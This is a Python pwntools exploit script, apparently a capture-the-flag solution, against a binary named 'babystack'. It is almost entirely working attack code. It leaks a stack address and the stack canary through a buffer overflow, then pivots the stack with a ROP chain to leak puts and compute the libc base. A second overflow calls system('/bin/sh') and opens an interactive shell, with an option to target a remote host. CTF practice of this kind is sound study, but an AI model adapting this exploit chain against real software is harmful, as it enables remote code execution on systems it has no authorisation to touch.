#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 1
if debug:
    context.log_level = "debug"

exe = "./babystack"
e = ELF(exe)
context.arch = e.arch
context.terminal = ["tmux","splitw","-h"]

arena64 = 0x3c4b20
arena32 = 0x1b2780

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
    libc = ELF("./libc.so.6")
else:
    p = process([exe])
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def csu(offset,end,front,fun_got,arg1,arg2,arg3):
    tmp = flat(["A"*offset,end,0,1,fun_got,arg3,arg2,arg1,front,"A"*0x38,vul])
    return tmp
def z():
    gdb.attach(p)

def st(con):
    ru(">> ")
    sl("1")
    sd(con)

def pt():
    ru(">> ")
    sl("2")

# leak stack 
p1 = "A"*0x80
st(p1)
pt()
r(0x80)
addr = u64(r(6).ljust(8,"\x00"))
print hex(addr)

# leak canary
p2 = "A"*0x88+"Z"
st(p2)
pt()
ru("Z")
canary = u64(r(7).rjust(8,"\x00"))
print hex(canary)

# stack pivot
# ebp = fake_addr ret = leave_ret_addr

'''
0x0000000000400a93 : pop rdi ; ret
0x0000000000400a91 : pop rsi ; pop r15 ; ret
0x0000000000400824 : leave ; ret
'''
rdi = 0x400a93
pp_rsi = 0x400a91
le_rt = 0x400824
'''
gdb-peda$ p 0x7ffca6a6a320 - 0x7ffca6a6a1b0
$2 = 0x170
'''

fake = addr-0x170
# leak libc addr 
# got 不可写 
puts_plt = e.plt["puts"]
puts_got = e.got["puts"]
main = 0x400908
p3 = flat(["A"*8,rdi,puts_got,puts_plt,main])

p4 = p64(canary)+p64(fake)+p64(le_rt)
fin = p3.ljust(0x88,"c")+p4
st(fin)
ru(">> ")
sl("3")

puts = u64(r(6).ljust(8,"\x00"))
libc.address = puts - libc.symbols["puts"]
bin_sh = libc.search("/bin/sh").next()
system = libc.symbols["system"]

fin2 = flat(["A"*0x88,canary,"B"*8,rdi,bin_sh,system])

st(fin2)
ru(">> ")

pause()
sl("3")

p.interactive()

